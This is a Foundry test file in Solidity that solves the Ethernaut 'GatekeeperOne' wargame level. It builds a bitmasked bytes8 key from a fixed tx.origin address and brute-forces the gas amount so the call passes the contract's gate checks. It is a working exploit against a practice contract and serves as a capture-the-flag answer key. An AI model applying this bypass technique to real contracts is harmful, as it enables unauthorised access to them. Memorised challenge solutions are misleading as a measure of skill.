// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {GatekeeperOne} from "ethernaut/levels/GatekeeperOne.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne public victim;
    address public txOrigin =
        address(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);

    function setUp() public {
        victim = new GatekeeperOne();
    }

    // key = uint64(x)
    // x & 0x00000000ffffffff == x & 0x000000000000ffff
    // x & 0x00000000ffff0000 == 0
    // x & 0xffffffff0000ffff

    // x & 0x00000000ffffffff != x
    // x & 0xffffffff00000000 != 0
    // x | 0xffffffff00000000

    //
    function testAttack() external {
        uint64 key = uint64(uint160(txOrigin));
        key = key & 0xffffffff0000ffff;
        key = key | 0xffffffff00000000;

        for (uint256 i = 0; i <= 8191; i++) {
            try victim.enter{gas: 800000 + i}(bytes8(key)) {
                console.log(800000 + i);
                break;
            } catch {}
        }

        assertEq(victim.entrant(), txOrigin);
    }
}
